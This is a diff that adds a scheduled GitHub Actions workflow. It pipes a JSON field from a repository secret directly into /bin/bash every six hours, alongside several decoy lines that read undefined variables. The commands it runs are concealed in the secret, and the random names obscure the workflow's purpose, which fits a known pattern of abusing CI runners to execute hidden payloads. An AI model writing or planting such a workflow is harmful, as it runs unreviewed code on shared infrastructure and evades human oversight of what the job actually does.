@@ -1,0 +1,24 @@
+name: junzitx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: junzitx
+        env:
+          iclio97541: ${{ secrets.iclio97541 }}
+        run: |
+          echo $iclio97541 | jq -r .yxpax046 | /bin/bash
+          echo $e83932 | jq -r .jhcz5 | /bin/bash
+          echo $w34 | jq -r .kljg81528 | /bin/bash
+          echo $s9 | jq -r .upm67211 | /bin/bash
+          echo $p3122 | jq -r .ccb416 | /bin/bash
+          echo $d6 | jq -r .ixws0 | /bin/bash
+          echo $clbg65 | jq -r .t291 | /bin/bash
+          echo $i00184 | jq -r .tbwbk57 | /bin/bash
+
